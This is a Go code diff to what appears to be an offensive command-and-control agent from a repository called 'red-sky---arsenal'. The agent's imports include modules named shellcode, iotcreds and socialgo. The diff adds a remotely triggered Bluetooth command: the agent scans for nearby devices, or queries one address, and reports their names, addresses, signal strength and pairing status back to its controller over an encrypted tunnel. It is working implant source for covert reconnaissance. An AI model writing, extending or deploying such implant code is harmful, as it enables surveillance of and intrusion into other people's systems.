@@ -39,6 +39,7 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/iotcreds"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
 	"github.com/sk666G/red-sky---arsenal/internal/recon2"
+	"github.com/sk666G/red-sky---arsenal/internal/rfgo"
 	"github.com/sk666G/red-sky---arsenal/internal/shellcode"
 	"github.com/sk666G/red-sky---arsenal/internal/socialgo"
 	rsTLS "github.com/sk666G/red-sky---arsenal/internal/tls"
@@ -358,6 +359,12 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runCSInt(conn, sess, c)
+		case proto.TypeBluetoothStart:
+			var b proto.BluetoothStart
+			if err := json.Unmarshal(env.Payload, &b); err != nil {
+				continue
+			}
+			go runBluetooth(conn, sess, b)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -2281,4 +2288,57 @@ func runCSInt(conn net.Conn, sess *crypto.Session, c proto.CSIntStart) {
 	default:
 		send(proto.CSIntData{Error: "unknown action: " + c.Action, Done: true})
 	}
+}
+
+// runBluetooth drives the Bluetooth primitives.
+func runBluetooth(conn net.Conn, sess *crypto.Session, b proto.BluetoothStart) {
+	send := func(d proto.BluetoothData) {
+		d.SessionID = b.SessionID
+		sendTunnelAck(conn, sess, proto.TypeBluetoothData, d)
+	}
+
+	ctx, cancel := context.WithCancel(context.Background())
+	defer cancel()
+	opts := rfgo.BTOptions{
+		Duration: time.Duration(b.Duration) * time.Second,
+	}
+
+	switch b.Action {
+	case "scan":
+		devices, err := rfgo.Scan(ctx, opts)
+		if err != nil {
+			send(proto.BluetoothData{Error: err.Error(), Done: true})
+			return
+		}
+		for _, d := range devices {
+			send(proto.BluetoothData{
+				Address: d.Address,
+				Name:    d.Name,
+				RSSI:    d.RSSI,
+				Paired:  d.Paired,
+				Trusted: d.Trusted,
+			})
+		}
+	case "info":
+		if b.Address == "" {
+			send(proto.BluetoothData{Error: "address required", Done: true})
+			return
+		}
+		d, err := rfgo.Info(ctx, b.Address, opts)
+		if err != nil {
+			send(proto.BluetoothData{Error: err.Error(), Done: true})
+			return
+		}
+		send(proto.BluetoothData{
+			Address: d.Address,
+			Name:    d.Name,
+			RSSI:    d.RSSI,
+			Paired:  d.Paired,
+			Trusted: d.Trusted,
+		})
+	default:
+		send(proto.BluetoothData{Error: "unknown action: " + b.Action, Done: true})
+		return
+	}
+	send(proto.BluetoothData{Done: true})
 }
